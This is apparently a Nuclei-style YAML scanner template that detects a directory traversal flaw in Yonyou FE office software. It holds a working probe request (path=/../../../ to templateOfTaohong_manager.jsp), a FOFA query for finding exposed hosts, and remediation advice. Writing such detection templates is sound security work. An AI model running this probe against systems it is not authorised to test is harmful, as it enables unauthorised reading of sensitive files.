id: yonyou-fe-directory-traversal

info:
  name: FE collaborative Office templateOfTaohong_manager.jsp - 路径遍历漏洞
  author: SleepingBag945
  severity: medium
  description: |
    该模板用于检测 FE collaborative Office templateOfTaohong_manager.jsp - 路径遍历漏洞。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  reference:
    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20FE%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0%20templateOfTaohong_manager.jsp%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md
  classification:
    cwe-id: CWE-23
  metadata:
    verified: true
    max-request: 1
    fofa-query: FE协作
  tags: yonyou,fe,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "window.location=\"templateOfTaohong_manager.jsp?path=\""
          - "var next=window.confirm(\"确定删除文件吗？\");"
        condition: and

      - type: status
        status:
          - 200
